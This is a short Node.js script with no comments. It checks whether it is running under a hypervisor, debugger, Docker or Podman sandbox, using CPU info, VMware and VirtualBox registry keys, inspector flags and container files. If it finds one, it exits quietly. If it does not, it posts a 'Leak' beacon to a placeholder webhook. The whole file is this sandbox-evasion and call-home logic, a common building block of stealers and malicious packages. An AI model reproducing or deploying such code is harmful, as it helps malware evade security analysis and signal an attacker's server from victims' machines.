const os = require("os");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const axios = require("axios");

const webhookUrl = "WEBHOOK";

const virtualizationPlatforms = [
  /Microsoft Corporation.*Hyper-V/i,
  /KVM/i,
  /Oracle Corporation.*VirtualBox/i,
  /Parallels.*Hypervisor/i,
  /VMware|VMware Virtual Platform/i,
  /QEMU/i,
];

const registryKeys = [
  "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
  //   "HKLM\\SOFTWARE\\VMware, Inc.",
  "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
  "HKLM\\SOFTWARE\\VMware, Inc.\\VMwareHostOpen",
  "HKLM\\SOFTWARE\\VMware, Inc.\\VMware VGAuth",
  "HKLM\\SOFTWARE\\RegisteredApplications\\VMware Host Open",
];

async function sendWebhookMessage() {
  const message = {
    content: "Leak",
  };

  try {
    const response = await axios.post(webhookUrl, message);
  } catch (err) {
    // do nothing
  }
}

function isRunningInVM() {
  return new Promise((resolve, reject) => {
    const platform = os.platform();
    const isPlatformVirtual = virtualizationPlatforms.some((regex) =>
      regex.test(platform)
    );
    if (isPlatformVirtual) {
      resolve(true);
      return;
    }

    const cpuinfoPath = path.join("/", "proc", "cpuinfo");
    if (fs.existsSync(cpuinfoPath)) {
      fs.readFile(cpuinfoPath, "utf8", (err, cpuinfo) => {
        if (err) {
          console.error(err.code);
        } else {
          const isCpuinfoVirtual = virtualizationPlatforms.some((regex) =>
            regex.test(cpuinfo)
          );
          if (isCpuinfoVirtual) {
            resolve(true);
            return;
          }
        }
      });
    }

    let foundKey = false;
    for (let key of registryKeys) {
      exec(`reg query "${key}" 2>nul`, (error, stdout, stderr) => {
        if (stdout && !foundKey) {
          foundKey = true;
          resolve(true);
        }
      });
    }

    if (
      typeof v8debug === "object" ||
      /--debug|--inspect/.test(process.execArgv.join(" "))
    ) {
      resolve(true);
      return;
    }

    if (fs.existsSync("/.dockerenv")) {
      resolve(true);
      return;
    }

    if (
      fs.existsSync("/proc/self/cgroup") &&
      fs.readFileSync("/proc/self/cgroup", "utf-8").includes("libpod")
    ) {
      resolve(true);
      return;
    }

    resolve(false);
  });
}

const sleep = (milliseconds) => {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
};

async function main() {
  if (await isRunningInVM()) {
    process.exit(1);
  } else {
    sendWebhookMessage();
  }
}

main().catch((err) => {
  console.error(err);
});
